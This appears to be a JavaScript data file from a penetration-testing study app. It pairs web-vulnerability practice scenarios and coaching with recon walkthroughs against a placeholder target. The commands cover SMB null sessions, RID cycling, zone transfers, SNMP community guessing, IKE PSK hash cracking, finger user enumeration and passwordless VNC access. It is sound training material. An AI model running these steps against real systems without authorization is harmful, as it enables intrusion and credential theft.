    'svn-exposed': { situation: 'You pulled a 200 on /.svn/entries (or wc.db) and the Subversion metadata is readable.', choices: ['svn-exposed', 'git-exposed', 'content-discovery', 'lfi-probe'], coach: { 'git-exposed': 'Same class of mistake for Git; use that when you see /.git/. This box leaked /.svn/, so rebuild from the Subversion metadata.', 'content-discovery': 'That is how you found /.svn/. Now extract the working-copy files it exposes.', 'lfi-probe': 'A different bug. The exposed metadata already leaks source and paths without any file-read trick.' } },
    'ssrf': { situation: 'An endpoint takes a url= parameter, fetches that address server-side, and shows you the response.', choices: ['ssrf', 'lfi-probe', 'xxe', 'command-injection'], coach: { 'lfi-probe': 'That targets local file reads through a path parameter. Here the parameter makes the server fetch a URL, so point that fetch at an internal host or metadata service.', 'xxe': 'XXE can pivot to SSRF, but you have a direct URL-fetch parameter with no XML in sight. Abuse it directly.', 'command-injection': 'Different sink. Nothing says the input reaches a shell; it says the server fetches a URL. Redirect that fetch inward.' } },
    'ssti': { situation: 'You put {{7*7}} in a profile field and the page comes back showing 49.', choices: ['ssti', 'xss-basics', 'command-injection', 'lfi-probe'], coach: { 'xss-basics': 'If the server computed 7 times 7 into 49 it evaluated your input, which is template injection. Reflected XSS would echo {{7*7}} back verbatim.', 'command-injection': 'Often the eventual goal, since SSTI frequently leads to code execution, but first confirm which template engine you are in and build its payload. The 49 says template, not shell, so far.', 'lfi-probe': 'Wrong signal. A math expression evaluating to 49 is template evaluation, not a file read.' } },
    'xxe': { situation: 'An endpoint accepts an XML body and reflects one of the parsed element values back in the response.', choices: ['xxe', 'ssrf', 'deserialization', 'ssti'], coach: { 'ssrf': 'XXE can reach SSRF, but the fact in hand is an XML parser reflecting entities. Define an external entity and read a local file or hit an internal host first.', 'deserialization': 'Different class. This is XML entity expansion, not an object stream, so feed it a malicious DOCTYPE.', 'ssti': 'No template evaluation here; the server is parsing XML. External entities are the lever.' } },
    'deserialization': { situation: 'A cookie carries a long base64 blob that decodes to a serialized object (it begins rO0AB or O:8:).', choices: ['deserialization', 'jwt-attacks', 'xxe', 'command-injection'], coach: { 'jwt-attacks': 'A JWT is three base64 parts split by dots and starts eyJ. This decodes to a serialized object, which is a deserialization sink, not a token.', 'xxe': 'Only if the blob were XML. A serialized object stream wants a gadget chain, not an external entity.', 'command-injection': 'Often the end result, but you reach it by crafting a gadget-chain payload for the deserializer, not by injecting shell metacharacters.' } },
    'jwt-attacks': { situation: 'Your session cookie is three dot-separated base64 segments beginning eyJhbGciOiJIUzI1NiJ9.', choices: ['jwt-attacks', 'deserialization', 'idor', 'nosql-injection'], coach: { 'deserialization': 'That blob is a JWT (eyJ..., three dot-separated parts), not a serialized object. Attack the token signature or algorithm, not a gadget chain.', 'idor': 'You might reach IDOR after forging a token, but the token itself is the weakness right now. Try alg:none or a weak HMAC secret.', 'nosql-injection': 'Different sink entirely. This is a signed token, so go after the signing.' } },
    'nosql-injection': { situation: 'A login API is backed by MongoDB and you suspect it drops your input straight into a document query.', choices: ['nosql-injection', 'sqli-basics', 'jwt-attacks', 'command-injection'], coach: { 'sqli-basics': 'Quote and UNION tricks do not apply to a document store. For Mongo, inject operators like $ne or $gt in a JSON body instead.', 'jwt-attacks': 'Only if the auth is token-based. Here the weakness is how the query consumes your input, not a token.', 'command-injection': 'Wrong sink. The input lands in a NoSQL query, so inject query operators, not shell characters.' } },
    'tomcat-deploy': { situation: 'You reached /manager/html and a weak set of manager credentials just logged you in.', choices: ['tomcat-deploy', 'jenkins-access', 'web-shells', 'file-upload'], coach: { 'jenkins-access': 'Different application server. That is the move when you find Jenkins; here you have the Tomcat manager, so deploy a WAR.', 'web-shells': 'That is essentially the payload, but on Tomcat you deliver it as a WAR through the manager, not by dropping a file via an upload form.', 'file-upload': 'There is no generic upload form here. The manager deploy function is your upload, so use it.' } },
    'jenkins-access': { situation: 'A Jenkins dashboard is reachable and the Script Console is available to your session.', choices: ['jenkins-access', 'tomcat-deploy', 'command-injection', 'web-shells'], coach: { 'tomcat-deploy': 'Different application server. WAR deploy is the Tomcat path; Jenkins instead hands you a Groovy script console.', 'command-injection': 'You are not injecting into a parameter. Jenkins gives you a legitimate console that runs Groovy as the service account, so use it directly.', 'web-shells': 'No need to smuggle a shell in. The script console already executes code; just run your command there.' } },
    'wordpress': { situation: 'whatweb reports WordPress with several active plugins and a visible author archive.', choices: ['wordpress', 'content-discovery', 'nikto-scan', 'check-cms-version'], coach: { 'content-discovery': 'Generic directory brute-forcing misses the real WordPress attack surface. A WP-aware enumeration names the vulnerable plugins and users for you.', 'nikto-scan': 'A broad server scan will not enumerate WP plugins and their CVEs. Take the WordPress-specific path.', 'check-cms-version': 'That only reads the version. The WordPress workflow enumerates users, plugins and themes and then chains the actual vulnerability.' } },
    'command-injection': { situation: 'A network-tools page runs a ping for you and prints the raw output, and you suspect your input reaches a shell.', choices: ['command-injection', 'ssti', 'lfi-probe', 'ssrf'], coach: { 'ssti': 'That is when math like 7*7 evaluates to 49. Here the page runs a system command with your input, so inject a shell separator (; or && or backticks) and watch for command output.', 'lfi-probe': 'Only if the parameter named a file. A box that runs a tool with your input is a shell sink, so test command separators.', 'ssrf': 'Close cousin, but SSRF makes the server fetch a URL. This makes it run a command, so test with ;id.' } },
    'idor': { situation: 'Your own invoice is at /invoice/1001, and changing the number to 1000 loads a different customer document.', choices: ['idor', 'jwt-attacks', 'sqli-basics', 'param-discovery'], coach: { 'jwt-attacks': 'The token is fine, you are properly authenticated. The bug is that the server trusts the object id in the URL without checking ownership, so walk the ids.', 'sqli-basics': 'You are not injecting into a query, you are swapping a legitimate id the app fails to authorize. Enumerate the references.', 'param-discovery': 'You already found the parameter, the id in the path. The win is incrementing it, not finding more inputs.' } },
    'verb-tampering': { situation: 'GET /admin/ returns 403, but you suspect the access rule only covers GET.', choices: ['verb-tampering', 'idor', 'check-http-methods', 'content-discovery'], coach: { 'idor': 'Different control flaw. IDOR swaps object ids; here the question is whether the 403 applies only to one HTTP method. Try POST, HEAD or PUT.', 'check-http-methods': 'Good recon, it tells you which verbs the server allows, and it is a fair precursor. But the exploit is issuing the blocked action with a verb the rule forgot to cover.', 'content-discovery': 'You already found /admin/. The question now is how the 403 is enforced, not where else to look.' } },
    'xss-basics': { situation: 'A search box reflects your query unescaped, and typing <b>test</b> shows up as bold text.', choices: ['xss-basics', 'ssti', 'command-injection', 'idor'], coach: { 'ssti': 'Rendered HTML tags (bold showing) means reflected XSS. SSTI is when server-side expressions like 7*7 evaluate to 49, which is not happening here.', 'command-injection': 'Nothing here reaches a shell; your HTML is reflected into the page. That is XSS, so aim it at a session cookie or an admin action.', 'idor': 'Different bug. This is unescaped output reflected to the browser, not an unauthorized object reference.' } },
    'check-log4shell': { situation: 'A Java app logs a header you control and you want to know whether it runs a vulnerable Log4j.', choices: ['check-log4shell', 'ssti', 'command-injection', 'check-struts2'], coach: { 'ssti': 'Different engine. Log4Shell fires through a JNDI lookup string in a logged field, not a template expression. Send the ${jndi:...} canary.', 'command-injection': 'You are not injecting shell metacharacters, you are getting a vulnerable logger to resolve a JNDI URL. Test with a DNS or LDAP canary first.', 'check-struts2': 'Also a Java remote-code bug, but that one is an OGNL expression via a crafted Content-Type header. Log4Shell is the JNDI-in-a-logged-string flaw.' } },
    'check-struts2': { situation: 'You are facing an Apache Struts2 app with .action endpoints and suspect the Content-Type OGNL bug.', choices: ['check-struts2', 'check-log4shell', 'command-injection', 'ssti'], coach: { 'check-log4shell': 'Also Java remote code, but that is a JNDI lookup in a logged value. CVE-2017-5638 is an OGNL expression smuggled through the Content-Type header.', 'command-injection': 'The sink is OGNL expression evaluation in the multipart parser, not a shell parameter. Craft the Content-Type payload.', 'ssti': 'Conceptually similar (server-side expression evaluation), but this is the specific Struts2 Content-Type OGNL vector, not a general web template engine.' } },
  };
  Object.keys(PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var p = PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = p.situation; OBOL.STUDY_FIXTURES[k].choices = p.choices; OBOL.STUDY_FIXTURES[k].coach = p.coach; } });

  // "How you got here" lead-ups, merged in the same way as PRACTICE. Recon moves are opening moves,
  // so most are reached straight off a scan; a genuine second route is given only where one really
  // exists (fast-scan port vs version-scan fingerprint, an alt web port, a leaked domain name, etc.),
  // never a clone. The root scan (nmap-fast-open-ports) has no lead-up by design.
  var RECON_LEADUPS = {
    'nmap-fast-open-ports': [
      { key: 'scope', label: 'The engagement handed you a target', steps: [
        { title: 'A target IP in scope, nothing else yet', tool: 'ping', where: 'local', cmd: 'ping -c1 10.10.10.10', out: '64 bytes from 10.10.10.10: icmp_seq=1 ttl=127 time=28.4 ms\n1 packets transmitted, 1 received, 0% packet loss', sig: '0% packet loss', teach: 'Step zero: one IP, no creds, no known ports. Confirm the host answers (ttl near 128 hints Windows, near 64 hints Linux), then let the fast scan draw the map every later recon move reads from.' } ] },
    ],
    'nmap-version-scripts': [
      { key: 'scan', label: 'The fast scan found open ports', steps: [
        { title: 'Sweep every TCP port', tool: 'nmap', where: 'local', cmd: 'nmap -p- --min-rate 5000 <target>', out: 'PORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql', sig: '3306/tcp open  mysql', teach: 'The fast sweep names the open ports but not the software behind them; that gap is what this move fills.' } ] },
    ],
    'nmap-vuln-scripts': [
      { key: 'fingerprint', label: 'The version scan named an old service', steps: [
        { title: 'Fingerprint the open ports', tool: 'nmap', where: 'local', cmd: 'nmap -sCV -p 139,445 <target>', out: '445/tcp open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1', sig: 'Windows Server 2008 R2', teach: 'An unpatched 2008 R2 box is exactly what the vuln NSE category checks for (ms17-010 and friends).' } ] },
    ],
    'nmap-udp-top': [
      { key: 'tcp-quiet', label: 'TCP came up thin', steps: [
        { title: 'Sweep TCP and find little', tool: 'nmap', where: 'local', cmd: 'nmap -p- --min-rate 5000 <target>', out: 'PORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http', sig: '22/tcp open  ssh', teach: 'Two quiet TCP ports and no obvious way in; the half of the attack surface everyone forgets is UDP.' } ] },
    ],
    'recon-smb-anon': [
      { key: 'scan', label: 'The scan found 445', steps: [
        { title: 'Sweep every TCP port', tool: 'nmap', where: 'local', cmd: 'nmap -p- --min-rate 5000 <target>', out: '139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds', sig: '445/tcp open  microsoft-ds', teach: '445 open means SMB; the cheapest possible first test is to log in as nobody.' } ] },
      { key: 'fingerprint', label: 'The version scan named Samba', steps: [
        { title: 'Fingerprint the service', tool: 'nmap', where: 'local', cmd: 'nmap -sCV -p 445 <target>', out: '445/tcp open  netbios-ssn Samba smbd 4.6.2', sig: 'Samba smbd 4.6.2', teach: 'A Samba box frequently allows a null session; anonymous enumeration is the natural first swing.' } ] },
    ],
    'recon-web-triage': [
      { key: 'port80', label: 'The scan found 80', steps: [
        { title: 'Sweep every TCP port', tool: 'nmap', where: 'local', cmd: 'nmap -p- --min-rate 5000 <target>', out: '22/tcp open  ssh\n80/tcp open  http', sig: '80/tcp open  http', teach: 'A web port is the richest surface on the exam; fingerprint the stack before you fuzz anything.' } ] },
      { key: 'altport', label: 'The scan found an alternate web port', steps: [
        { title: 'Sweep every TCP port', tool: 'nmap', where: 'local', cmd: 'nmap -p- --min-rate 5000 <target>', out: '22/tcp   open  ssh\n8080/tcp open  http-proxy', sig: '8080/tcp open  http-proxy', teach: '8080 and 8443 are web too, and often run a different app than 80; triage each one on its own.' } ] },
    ],
    'recon-dns': [
      { key: 'port53', label: 'The scan found 53', steps: [
        { title: 'Spot the DNS port', tool: 'nmap', where: 'local', cmd: 'nmap -p 53 <target>', out: '53/tcp open  domain', sig: '53/tcp open  domain', teach: 'A reachable nameserver is worth a zone-transfer attempt and, failing that, record enumeration.' } ] },
      { key: 'domain', label: 'A banner leaked the domain name', steps: [
        { title: 'Read the LDAP root DSE', tool: 'nmap', where: 'local', cmd: 'nmap -p 389 --script ldap-rootdse <target>', out: '| ldap-rootdse:\n|   rootDomainNamingContext: DC=corp,DC=local', sig: 'DC=corp,DC=local', teach: 'Now you know the domain; point your DNS queries at its nameserver and ask for the zone.' } ] },
    ],
    'recon-snmp': [
      { key: 'udp', label: 'The UDP scan found 161', steps: [
        { title: 'Check the top UDP ports', tool: 'nmap', where: 'local', cmd: 'sudo nmap -sU --top-ports 50 <target>', out: '161/udp open  snmp', sig: '161/udp open  snmp', teach: 'SNMP answering on 161 is a quiet goldmine if the community string was never changed from the default.' } ] },
    ],
    'recon-ike-vpn': [
      { key: 'udp500', label: 'The UDP scan found 500', steps: [
        { title: 'Check the top UDP ports', tool: 'nmap', where: 'local', cmd: 'sudo nmap -sU -p 500 <target>', out: '500/udp open  isakmp', sig: '500/udp open  isakmp', teach: 'An IKE endpoint on 500 may still accept aggressive mode and hand you a crackable PSK hash.' } ] },
    ],
    'recon-finger': [
      { key: 'port79', label: 'The scan found 79', steps: [
        { title: 'Spot the finger port', tool: 'nmap', where: 'local', cmd: 'nmap -p 79 <target>', out: '79/tcp open  finger', sig: '79/tcp open  finger', teach: 'Finger is rare but, when open, confirms real usernames for free: a ready-made spray list.' } ] },
    ],
    'recon-vnc': [
      { key: 'port5900', label: 'The scan found 5900', steps: [
        { title: 'Spot the VNC port', tool: 'nmap', where: 'local', cmd: 'nmap -p 5900 <target>', out: '5900/tcp open  vnc', sig: '5900/tcp open  vnc', teach: 'A VNC service begs one blunt question: does it even ask for a password?' } ] },
    ],
    'recon-smtp': [
      { key: 'port25', label: 'The scan found 25', steps: [
        { title: 'Spot the mail port', tool: 'nmap', where: 'local', cmd: 'nmap -p 25 <target>', out: '25/tcp open  smtp', sig: '25/tcp open  smtp', teach: 'A mail server on 25 may answer VRFY or EXPN and verify your username guesses for free.' } ] },
      { key: 'banner', label: 'The version scan named the mail server', steps: [
        { title: 'Fingerprint the mail server', tool: 'nmap', where: 'local', cmd: 'nmap -sCV -p 25 <target>', out: '25/tcp open  smtp Postfix smtpd\n|_smtp-commands: mail.corp.local, VRFY, EXPN', sig: 'VRFY, EXPN', teach: 'The banner itself advertised VRFY and EXPN; those are exactly the verbs that confirm users.' } ] },
    ],
    'recon-ftp': [
      { key: 'port21', label: 'The scan found 21', steps: [
        { title: 'Spot the FTP port', tool: 'nmap', where: 'local', cmd: 'nmap -p 21 <target>', out: '21/tcp open  ftp', sig: '21/tcp open  ftp', teach: 'FTP on 21 gets one free test before anything else: the anonymous login.' } ] },
      { key: 'anon', label: 'The version scan flagged anonymous login', steps: [
        { title: 'Fingerprint the FTP service', tool: 'nmap', where: 'local', cmd: 'nmap -sCV -p 21 <target>', out: '21/tcp open  ftp vsftpd 3.0.3\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)', sig: 'Anonymous FTP login allowed', teach: 'nmap already proved anonymous works; log in and see what the share leaks.' } ] },
    ],
    'recon-mail': [
      { key: 'ports', label: 'The scan found 110 or 143', steps: [
        { title: 'Spot the mailbox ports', tool: 'nmap', where: 'local', cmd: 'nmap -p 110,143,993,995 <target>', out: '110/tcp open  pop3\n143/tcp open  imap', sig: '110/tcp open  pop3', teach: 'POP3 and IMAP serve mailboxes; with a credential, reading the mail is itself an attack.' } ] },
    ],
    'rdp-enum': [
      { key: 'port3389', label: 'The scan found 3389', steps: [
        { title: 'Spot the RDP port', tool: 'nmap', where: 'local', cmd: 'nmap -p 3389 <target>', out: '3389/tcp open  ms-wbt-server', sig: '3389/tcp open  ms-wbt-server', teach: 'RDP open means you can read its NLA mode now, and log in the moment you hold a credential.' } ] },
      { key: 'cred', label: 'You already hold a credential', steps: [
        { title: 'A share dump leaked a password', tool: 'netexec', where: 'local', cmd: 'nxc smb <target> -u svc_backup -p "Winter2024!" --shares', out: 'SMB  <target>  445  TARGET  [+] ACME\\svc_backup:Winter2024!\nSHARE  backups  READ', sig: 'svc_backup', teach: 'With a credential in hand, the question becomes whether that account can reach the desktop over RDP.' } ] },
    ],
    'nfs-enum': [
      { key: 'port2049', label: 'The scan found 2049', steps: [
        { title: 'Spot the NFS port', tool: 'nmap', where: 'local', cmd: 'nmap -p 2049 <target>', out: '2049/tcp open  nfs', sig: '2049/tcp open  nfs', teach: 'NFS shares a filesystem over the network; the question is what it exports and to whom.' } ] },
      { key: 'rpcbind', label: 'rpcbind on 111 pointed the way', steps: [
        { title: 'List RPC services', tool: 'nmap', where: 'local', cmd: 'nmap -sCV -p 111 <target>', out: '111/tcp open  rpcbind\n|   100003  3,4  2049/tcp  nfs', sig: '100003', teach: 'rpcbind advertised nfs behind it; ask showmount what directories it hands out.' } ] },
    ],
  };
  Object.keys(RECON_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = RECON_LEADUPS[k]; });

  // Field notes ("how to actually do it") for the recon lane, every item a playable demo.
  var RECON_HOW = {
    "nmap-fast-open-ports": {"lead":"The opening scan has one job: find every open TCP port fast, so nothing is missed before you go deep.","items":[
      {"t":"Sweep all 65535 ports fast","d":"-p- scans every port and --min-rate pushes packets out quickly, so a full sweep finishes in a minute or two on a lab box.","demo":[{"run":"nmap -p- --min-rate 5000 -v <target>","out":"Discovered open port 22/tcp on <target>\nDiscovered open port 80/tcp on <target>\nDiscovered open port 445/tcp on <target>\nNmap done: 1 IP address (1 host up) scanned in 42.13s","sig":"Discovered open port 445/tcp"}],"note":"A full sweep catches the high-numbered ports a default top-1000 scan silently skips."},
      {"t":"Save the open ports for the deep scan","d":"Greppable output (-oG -) pipes straight into a comma list you feed the targeted version scan.","demo":[{"run":"nmap -p- --min-rate 5000 <target> -oG -  | grep open","out":"Host: <target> ()\tPorts: 22/open/tcp//ssh///, 80/open/tcp//http///, 445/open/tcp//microsoft-ds///","sig":"445/open/tcp"}],"note":"Greppable output turns straight into the -p list for nmap-version-scripts."},
      {"t":"Slow down if the box drops packets","d":"A firewalled or slow host loses ports to timeouts at a high rate; lower the rate and raise retries, then rescan.","demo":[{"run":"nmap -p- --max-rate 500 --max-retries 3 <target>","out":"445/tcp  open  microsoft-ds\n3389/tcp open  ms-wbt-server","sig":"3389/tcp open  ms-wbt-server"}],"note":"The steadier pass found 3389 that the aggressive first run had dropped."}]},
    "nmap-version-scripts": {"lead":"-sC -sV turns bare port numbers into named software with versions, the single most useful scan you run.","items":[
      {"t":"Fingerprint only the open ports","d":"Feed the ports from the fast scan; -sV grabs versions and -sC runs the safe default scripts that enrich them.","demo":[{"run":"nmap -sCV -p 22,80,445 <target>","out":"22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp  open  http    Apache httpd 2.4.49\n445/tcp open  netbios-ssn Samba smbd 4.6.2","sig":"Apache httpd 2.4.49"}],"note":"Apache 2.4.49 is a known path-traversal and RCE version; the exact number is the lead."},
      {"t":"Read the default-script extras","d":"The -sC scripts add page titles, certificates, and SMB OS details under each port, often the first real finding.","demo":[{"run":"nmap -sCV -p 445 <target>","out":"445/tcp open  microsoft-ds\n| smb-os-discovery:\n|   OS: Windows Server 2016 Standard\n|   Computer name: DC01","sig":"Computer name: DC01"}],"note":"smb-os-discovery just handed you the hostname and that this host is a domain controller."},
      {"t":"Grab a banner by hand when -sV is unsure","d":"If a service confuses version detection, curl or nc reads the raw banner so you can identify it yourself.","demo":[{"run":"curl -sI http://<target>","out":"HTTP/1.1 200 OK\nServer: Apache/2.4.49 (Unix)","sig":"Server: Apache/2.4.49"}],"note":"The raw Server header confirms exactly what -sV guessed."}]},
    "nmap-vuln-scripts": {"lead":"The vuln NSE category runs detection checks for known CVEs against the ports you already fingerprinted.","items":[
      {"t":"Run the vuln category on open ports","d":"--script vuln runs every detection script; scope it to the open ports so it finishes and stays relevant.","demo":[{"run":"nmap --script vuln -p 445 <target>","out":"| smb-vuln-ms17-010:\n|   State: VULNERABLE\n|_  IDs: CVE-2017-0143","sig":"State: VULNERABLE"}],"note":"A VULNERABLE verdict on ms17-010 is EternalBlue, a direct path to SYSTEM."},
      {"t":"Target one script when you have a hunch","d":"Know the service? Run its specific script instead of the whole noisy category: faster and less false-positive-prone.","demo":[{"run":"nmap --script smb-vuln-ms17-010 -p 445 <target>","out":"| smb-vuln-ms17-010:\n|   State: VULNERABLE (ms17-010)","sig":"VULNERABLE (ms17-010)"}],"note":"One focused script confirms the single CVE you suspect without the full set's noise."},
      {"t":"Corroborate before you trust it","d":"NSE vuln scripts can false-positive; check the hit against the real service version before firing an exploit.","demo":[{"run":"nmap -sCV -p 445 <target> | grep -i windows","out":"445/tcp open  microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1","sig":"Windows Server 2008 R2"}],"note":"An unpatched 2008 R2 build sits right in the CVE window, so the ms17-010 hit is credible."}]},
    "nmap-udp-top": {"lead":"UDP is slow but hides DNS, SNMP, TFTP, and IKE; a narrow top-ports pass is the sweet spot.","items":[
      {"t":"Scan the common UDP ports","d":"-sU on the top ports keeps the scan bounded; a full UDP sweep is rarely worth the hours it costs.","demo":[{"run":"sudo nmap -sU --top-ports 50 <target>","out":"53/udp  open          domain\n161/udp open          snmp\n500/udp open|filtered isakmp","sig":"161/udp open          snmp"}],"note":"SNMP on 161 is the standout; the open|filtered 500 still warrants an IKE check."},
      {"t":"Confirm an open|filtered port","d":"UDP often reads open|filtered; a version probe disambiguates whether the service is really there.","demo":[{"run":"sudo nmap -sUV -p 161 <target>","out":"161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server","sig":"SNMPv1 server"}],"note":"The version probe confirmed 161 is genuinely open, not open|filtered; guess the community string with onesixtyone next."},
      {"t":"Switch to the service's own tool","d":"Once a UDP service is confirmed, its dedicated tool is faster and richer than more nmap: snmpwalk, dig, ike-scan.","demo":[{"run":"snmpwalk -v2c -c public <target> 1.3.6.1.2.1.1.5.0","out":"SNMPv2-MIB::sysName.0 = STRING: fileserver01","sig":"STRING: fileserver01"}],"note":"snmpwalk confirmed read access and returned the hostname in a single query."}]},
    "recon-smb-anon": {"lead":"Before anything paid, try the free SMB session: null and guest logins still work far too often.","items":[
      {"t":"List shares as a null session","d":"-N sends no password; a null session that returns the share list is an immediate win.","demo":[{"run":"smbclient -L //<target>/ -N","out":"Sharename       Type      Comment\n---------       ----      -------\nbackups         Disk\nIPC$            IPC","sig":"backups         Disk"}],"note":"A readable backups share over a null session is exactly what you hoped for."},
      {"t":"Confirm and enumerate with netexec","d":"nxc smb with empty creds confirms the null session and flags signing, the OS, and the domain in one line.","demo":[{"run":"nxc smb <target> -u '' -p '' --shares","out":"SMB  <target>  445  DC01  [+] corp.local\\: (Guest)\nSMB  <target>  445  DC01  backups  READ","sig":"backups  READ"}],"note":"nxc confirms READ on backups and names the domain and host at the same time."},
      {"t":"Cycle RIDs for a user list","d":"Even without share access, --rid-brute walks RIDs into a domain user list, the seed for spraying and roasting.","demo":[{"run":"nxc smb <target> -u '' -p '' --rid-brute","out":"512: CORP\\Domain Admins (SidTypeGroup)\n1103: CORP\\jsmith (SidTypeUser)","sig":"CORP\\jsmith"}],"note":"RID cycling turned an anonymous session into real usernames like jsmith."},
      {"t":"Spider a readable share","d":"A recursive listing pulls filenames; configs and backups routinely leak credentials and connection strings.","demo":[{"run":"smbclient //<target>/backups -N -c 'ls'","out":"  web.config                 A     1204\n  backup_2024.zip            A  5242880","sig":"web.config"}],"note":"A web.config in a readable share almost always carries a database connection-string password."}]},
    "recon-web-triage": {"lead":"Fingerprint the stack before fuzzing: the server, framework, and CMS decide every later choice.","items":[
      {"t":"Identify the stack with whatweb","d":"whatweb names the server, language, framework, and CMS from headers and body fingerprints in one request.","demo":[{"run":"whatweb http://<target>","out":"http://<target> [200 OK] Apache[2.4.49], PHP[7.4.3], WordPress[6.1]","sig":"WordPress[6.1]"}],"note":"WordPress means the WordPress-specific workflow, not a generic directory brute force."},
      {"t":"Read the headers yourself","d":"curl -I shows the Server, X-Powered-By, and any framework cookies the fingerprint tools might miss.","demo":[{"run":"curl -sI http://<target>","out":"HTTP/1.1 200 OK\nServer: Apache/2.4.49\nX-Powered-By: PHP/7.4.3\nSet-Cookie: wordpress_test_cookie=WP","sig":"X-Powered-By: PHP/7.4.3"}],"note":"The wordpress_test_cookie corroborates the CMS, and PHP is the language to target."},
      {"t":"Check robots.txt and the source","d":"robots.txt, HTML comments, and linked JS leak admin paths and versions the fingerprint tools skip.","demo":[{"run":"curl -s http://<target>/robots.txt","out":"User-agent: *\nDisallow: /wp-admin/\nDisallow: /backup-old/","sig":"Disallow: /backup-old/"}],"note":"robots.txt just pointed you at /backup-old/, a path no scanner would have guessed."}]},
    "recon-dns": {"lead":"A nameserver can hand you the whole internal map; try the zone transfer, then enumerate records.","items":[
      {"t":"Attempt a zone transfer","d":"AXFR asks the server for its entire zone; admins leave it open to the world constantly, and it dumps every record at once.","demo":[{"run":"dig axfr corp.local @<target>","out":"corp.local.     IN SOA  dc01.corp.local.\ndc01            IN A    10.10.10.5\nfileserver      IN A    10.10.10.8","sig":"fileserver      IN A    10.10.10.8"}],"note":"A successful AXFR just mapped the internal hosts, DNS names and all."},
      {"t":"Enumerate records when AXFR is refused","d":"No transfer? Query records directly: NS, MX, and TXT often name the mail host and internal services.","demo":[{"run":"dig +short MX corp.local @<target>","out":"10 mail.corp.local.","sig":"mail.corp.local"}],"note":"Even without AXFR, the MX record named the mail host to go after next."},
      {"t":"Brute-force subdomains","d":"dnsenum or a dig loop over a wordlist finds vhosts and services the main record set hides.","demo":[{"run":"dnsenum --dnsserver <target> -f subdomains.txt corp.local","out":"dev.corp.local.      10.10.10.21\nvpn.corp.local.      10.10.10.22","sig":"dev.corp.local."}],"note":"A dev subdomain is a less-hardened surface worth its own full enumeration."}]},
    "recon-snmp": {"lead":"SNMP with the default community string reads processes, users, software, and sometimes credentials.","items":[
      {"t":"Guess the community string","d":"onesixtyone sprays a short list (public, private, community) against 161 and reports which one answers.","demo":[{"run":"onesixtyone -c community.txt <target>","out":"<target> [public] Linux fileserver01 5.4.0","sig":"[public]"}],"note":"public answered, so you have read access to the whole MIB tree."},
      {"t":"Walk the whole tree","d":"snmpwalk with the string dumps everything; -v2c is the common version and the full walk is a goldmine.","demo":[{"run":"snmpwalk -v2c -c public <target>","out":"HOST-RESOURCES-MIB::hrSWRunName.412 = STRING: \"backup.sh\"\nSNMPv2-MIB::sysContact.0 = STRING: admin@corp.local","sig":"backup.sh"}],"note":"A running backup.sh and an admin contact are leads for scheduled-task abuse and phishing."},
      {"t":"Target the useful OIDs","d":"Specific OIDs are faster: running processes, installed software, and on Windows the local user accounts.","demo":[{"run":"snmpwalk -v2c -c public <target> 1.3.6.1.4.1.77.1.2.25","out":"STRING: \"Administrator\"\nSTRING: \"jsmith\"","sig":"\"jsmith\""}],"note":"The user-accounts OID handed you a local user list without any login."}]},
    "recon-ike-vpn": {"lead":"An IKE endpoint in aggressive mode returns a crackable PSK hash inside the handshake.","items":[
      {"t":"Fingerprint the IKE service","d":"ike-scan sends a main-mode probe and reads the vendor and transforms, confirming the VPN is live.","demo":[{"run":"sudo ike-scan <target>","out":"<target>  Main Mode Handshake returned\n  SA=(Enc=3DES Hash=SHA1 Group=2 Auth=PSK)","sig":"Auth=PSK"}],"note":"PSK authentication is the prerequisite for the aggressive-mode hash grab."},
      {"t":"Grab the aggressive-mode hash","d":"-A requests aggressive mode; if the server honours it, the PSK hash comes back in the response.","demo":[{"run":"sudo ike-scan -A -P hash.txt <target>","out":"Aggressive Mode Handshake returned\nHASH saved to hash.txt","sig":"Aggressive Mode Handshake returned"}],"note":"The server answered aggressive mode and the PSK hash is now on disk."},
      {"t":"Crack the PSK offline","d":"psk-crack runs a wordlist against the captured hash; a weak pre-shared key falls in seconds.","demo":[{"run":"psk-crack hash.txt","out":"key \"VPNsecret123\" matches SHA1 hash","sig":"matches SHA1 hash"}],"note":"The cracked PSK is the first half of VPN access; you still need a user credential."}]},
    "recon-finger": {"lead":"Finger confirms which accounts exist and who is logged in, a free username list on old Unix hosts.","items":[
      {"t":"Query a likely user","d":"finger user@host returns whether the account exists and its login details, confirming names one at a time.","demo":[{"run":"finger root@<target>","out":"Login: root   Name: root\nDirectory: /root   Shell: /bin/bash\nOn since Mon 09:15","sig":"Login: root"}],"note":"root exists and is logged in; the shell and home confirm it is a real, active account."},
      {"t":"Enumerate a list with a script","d":"finger-user-enum tests a name wordlist and keeps the hits, building a verified user list.","demo":[{"run":"finger-user-enum.pl -U users.txt -t <target>","out":"admin@<target>: admin   still logged in\nbackup@<target>: backup","sig":"admin@<target>: admin"}],"note":"admin and backup are confirmed accounts to feed a spray or an SSH brute."},
      {"t":"Read who is active now","d":"finger @host with no user lists everyone currently logged in, which hints at the live admin accounts.","demo":[{"run":"finger @<target>","out":"Login     Name       Tty      Idle\njsmith    John Smith pts/0    2:11","sig":"jsmith    John Smith"}],"note":"jsmith is active now, so that account is a high-value target if you can reach it."}]},
    "recon-vnc": {"lead":"The VNC question is blunt: does it ask for a password at all, and if so, is it weak?","items":[
      {"t":"Read the security mode","d":"The vnc-info script reports the authentication types the server offers; None is an unauthenticated desktop.","demo":[{"run":"nmap --script vnc-info -p 5900 <target>","out":"| vnc-info:\n|   Security types:\n|_    None (1)","sig":"None (1)"}],"note":"Security type None means you can connect to the desktop with no password at all."},
      {"t":"Connect and look","d":"vncviewer opens the session; a None server drops you straight onto the desktop, often already logged in.","demo":[{"run":"vncviewer <target>::5900","out":"Connected to <target>\nDesktop name \"root's X desktop\"","sig":"root's X desktop"}],"note":"You are on root's desktop over VNC, an interactive session before any exploit."},
